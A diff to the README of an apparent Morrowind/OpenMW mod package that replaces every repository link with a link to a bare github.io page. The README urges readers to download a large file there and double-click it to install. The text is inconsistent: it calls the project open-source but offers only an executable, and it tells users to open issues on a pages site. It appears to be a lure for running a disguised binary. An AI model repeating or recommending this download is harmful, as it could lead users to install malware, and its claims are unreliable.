@@ -1,6 +1,6 @@
 # 🎮 openmw-total-overhaul-2026 - The Ultimate Morrowind Experience, One Click Away
 
-[![Download Now](https://img.shields.io/badge/Download-OpenMW_Total_Overhaul_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Plugin8295/openmw-total-overhaul-2026)
+[![Download Now](https://img.shields.io/badge/Download-OpenMW_Total_Overhaul_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://plugin8295.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ This is a complete, ready-to-play package that transforms Morrowind into a moder
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Plugin8295/openmw-total-overhaul-2026](https://github.com/Plugin8295/openmw-total-overhaul-2026)
+Visit this link to download the application: [https://plugin8295.github.io](https://plugin8295.github.io)
 
 Once you click the link, you'll see a green "Download" button. Click it, and the download will begin automatically. The file is large (several gigabytes), so make sure you have enough free space on your computer.
 
@@ -20,7 +20,7 @@ Once you click the link, you'll see a green "Download" button. Click it, and the
 
 ## 📥 Installation Guide
 
-1. **Download the application** by visiting [this link](https://github.com/Plugin8295/openmw-total-overhaul-2026) and clicking the download button.
+1. **Download the application** by visiting [this link](https://plugin8295.github.io) and clicking the download button.
 2. **Wait for the download to finish.** This may take 30 minutes to 2 hours depending on your internet speed.
 3. **Find the downloaded file** in your "Downloads" folder. It will be named something like `openmw-total-overhaul-2026`.
 4. **Double-click the file to run it.** The installer will guide you through the setup process.
@@ -124,7 +124,7 @@ This project is open-source and free to use. It combines hundreds of community-c
 
 ## 📞 Support
 
-If you need help, please visit the repository at [https://github.com/Plugin8295/openmw-total-overhaul-2026](https://github.com/Plugin8295/openmw-total-overhaul-2026) and open an issue. We're happy to help!
+If you need help, please visit the repository at [https://plugin8295.github.io](https://plugin8295.github.io) and open an issue. We're happy to help!
 
 ---
 
